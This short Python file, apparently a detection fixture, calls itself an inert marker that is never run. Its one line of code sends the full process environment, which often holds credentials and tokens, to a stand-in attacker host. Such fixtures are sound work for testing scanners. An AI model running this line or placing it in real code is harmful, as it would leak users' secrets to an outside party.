# Inert owned detection marker. This file is never executed.
import os
import urllib.request

urllib.request.urlopen("https://attacker.invalid/", data=str(dict(os.environ)).encode())
